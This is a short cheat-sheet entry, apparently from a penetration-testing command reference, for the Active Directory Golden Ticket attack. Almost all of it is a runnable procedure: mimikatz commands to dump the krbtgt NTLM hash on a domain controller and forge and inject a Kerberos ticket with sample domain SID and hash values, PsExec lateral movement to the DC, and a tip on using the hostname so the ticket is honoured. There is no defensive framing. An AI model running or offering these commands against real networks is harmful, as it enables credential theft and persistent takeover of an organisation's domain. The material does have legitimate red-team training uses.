---
title: Golden Ticket
category: ad
subcategory: ad-attacks
os: windows
command: kerberos::golden /user:user /domain:domain /sid:SID /krbtgt:hash /ptt
tools: mimikatz, PsExec
---


Forge a TGT using the krbtgt password hash for full domain persistence.

### Step 1 - Dump krbtgt hash on the DC (needs Domain Admin)

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

Look for the `krbtgt` line and the `NTLM` value.

### Step 2 - Purge existing tickets

```
mimikatz # kerberos::purge
```

### Step 3 - Forge the golden ticket

```
mimikatz # kerberos::golden /user:maria /domain:intranet.local /sid:S-1-5-21-3842570612-715204487-3928531750 /krbtgt:4e82f4d28e35a85c7a4daa9158f4b8c1 /ptt
mimikatz # misc::cmd
```

Parameters:

- `/user:` - any existing username
- `/domain:` - domain FQDN
- `/sid:` - domain SID (`whoami /user`)
- `/krbtgt:` - krbtgt NTLM hash
- `/ptt` - inject directly

### Step 4 - Lateral movement to the DC

Use the new cmd from `misc::cmd`:

```cmd
PsExec.exe \\dc02 cmd.exe
whoami
whoami /groups
```

Important: connect by hostname (`\\dc02`), not IP - IP forces NTLM and the ticket won't be honored.
